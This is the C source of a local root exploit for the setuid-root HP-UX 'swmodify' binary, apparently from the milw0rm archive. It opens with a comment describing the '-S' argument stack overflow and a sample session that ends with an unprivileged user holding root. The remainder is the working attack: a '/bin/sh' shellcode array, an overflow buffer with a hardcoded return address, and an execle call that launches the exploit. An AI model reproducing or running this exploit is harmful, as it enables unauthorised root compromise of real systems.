/* HP-UX swmodify buffer overflow exploit
 * =======================================
 * HP-UX 'swmodify' contains an exploitable stack overflow
 * in the handling of command line arguements. Specifically the
 * problem occurs due to insufficent bounds checking in the "-S"
 * optional arguement. 'swmodify' is installed setuid root by
 * default in HP-UX and allows for local root compromise when
 * exploiting this issue.
 *
 * Example.
 * $ cc prdelka-vs-HPUX-swmodify.c -o prdelka-vs-HPUX-swmodify
 * /usr/ccs/bin/ld: (Warning) At least one PA 2.0 object file
 * (prdelka-vs-HPUX-swmodify.o) was detected. The linked output may
 * not run on a PA 1.x system.
 * $ uname -a
 * HP-UX hpux B.11.11 U 9000/785 2012383315 unlimited-user license
 * $ id
 * uid=102(user) gid=20(users)
 * $ ls -al /usr/sbin/swmodify
 * -r-sr-xr-x   2 root       bin        1323008 Nov  3  2003 /usr/sbin/swmodify
 * $ ./prdelka-vs-HPUX-swmodify
 * [ HP-UX 11i 'swmodify' local root exploit
 * $ id
 * uid=0(root) gid=3(sys) euid=102(user) egid=20(users)
 *
 * - prdelka
 */

char shellcode[]=
		 "\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22"
		 "\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08"
		 "\xb4\x16\x70\x16""/bin/sh";

int main(){
        char adr[4],*b,*a,*c,*envp[1];
        int i;
	*(unsigned long*)adr=0x7f7f0434;
	printf("[ HP-UX 11i 'swmodify' local root exploit\n");
        b=(char*)malloc(2048);
	a=b;
	memset(b,0,2048);
	memset(b,'a',1053);
	b+=1053;
        for(i=0;i<4;i++) *b++=adr[i%4];
	*b++="A";
	c=(char*)malloc(2048);
	b=c;
	memset(c,0,2048);
	sprintf(c,"PATH=");
	b+=5;
	for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
	envp[0]=c;
	envp[1]=0;
        execle("/usr/sbin/swmodify","swmodify","-S",a,0,envp);
}

// milw0rm.com [2006-10-24]